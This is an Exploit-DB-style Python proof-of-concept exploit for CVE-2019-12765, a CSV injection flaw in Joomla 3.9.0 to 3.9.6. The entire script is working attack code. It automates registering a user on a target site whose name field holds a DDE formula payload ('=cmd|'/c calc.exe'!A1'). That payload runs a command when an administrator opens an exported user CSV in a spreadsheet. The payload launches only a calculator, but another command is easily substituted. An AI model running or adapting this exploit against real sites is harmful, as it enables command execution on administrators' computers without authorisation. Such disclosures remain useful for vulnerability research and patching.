#!/usr/bin/python3

# Exploit Title: Joomla 3.9.0 < 3.9.7 - CSV Injection 
# Date: 2020-03-10
# Vulnerability Authors: Jose Antonio Rodriguez Garcia and Phil Keeble (MWR InfoSecurity)
# Exploit Author: Abdullah - @i4bdullah
# Vendor Homepage: https://www.joomla.org/
# Software Link: https://downloads.joomla.org/cms/joomla3/3-9-5/Joomla_3-9-5-Stable-Full_Package.zip?format=zip
# Version: 3.9.0 < 3.9.7
# Tested on: Ubuntu 18.04 LTS and Windows 7
# CVE : CVE-2019-12765

import mechanize
import sys

if (len(sys.argv) != 2):
    print(f'Usage: {sys.argv[0]} <Base URL>')
    print(f'Example: {sys.argv[0]} http://127.0.0.1 ')
    sys.exit(1)

base_url = sys.argv[1]
reg_url = f"{base_url}/joomla/index.php/component/users/?view=registration&Itemid=101"
login_url = f"{base_url}/joomla/index.php?option=com_users"

def pwn(username='abdullah'):
    payload = "=cmd|'/c calc.exe'!A1"
    print(f"Registering a new user with the name <{payload}>...")
    reg_form = mechanize.Browser()
    reg_form.set_handle_robots(False)
    reg_form.open(reg_url)
    reg_form.select_form(nr=0)
    reg_form.form['jform[name]'] = payload
    reg_form.form['jform[username]'] = username
    reg_form.form['jform[password1]'] = 'password'
    reg_form.form['jform[password2]'] = 'password'
    reg_form.form['jform[email1]'] = 'whatever@i4bdullah.com'
    reg_form.form['jform[email2]'] = 'whatever@i4bdullah.com'
    reg_form.submit()
    print("The exploit ran successfully.")
    print("Exiting...")
    sys.exit(0)

pwn()